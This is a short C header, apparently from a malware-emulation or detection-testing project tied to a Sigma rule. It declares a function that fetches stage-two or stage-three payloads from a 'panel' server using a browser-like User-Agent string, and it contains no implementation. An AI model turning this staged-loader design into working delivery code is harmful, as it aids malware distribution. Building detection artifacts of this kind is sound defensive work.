/*
 * HTTP Fetch Header
 *
 * Detection artifact: User-Agent string, staging URL pattern
 * Network signature target: stage1_network.yml (Sigma)
 */

#ifndef HTTP_H
#define HTTP_H

#include <stdint.h>
#include <stddef.h>

/* User-Agent for network detection */
#define HTTP_USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

/* Result codes */
#define HTTP_OK       0
#define HTTP_ERR_INIT -1
#define HTTP_ERR_CONN -2
#define HTTP_ERR_SEND -3
#define HTTP_ERR_RECV -4
#define HTTP_ERR_MEM  -5

/*
 * Fetch stage payload from panel.
 *
 * @param host     Panel hostname or IP
 * @param port     Panel port
 * @param stage    Stage number to fetch (2 or 3)
 * @param out_buf  Pointer to receive allocated buffer (caller must free)
 * @param out_len  Pointer to receive buffer length
 * @return         HTTP_OK on success, error code otherwise
 */
int http_fetch_stage(const char *host, uint16_t port, int stage,
                     uint8_t **out_buf, size_t *out_len);

#endif /* HTTP_H */
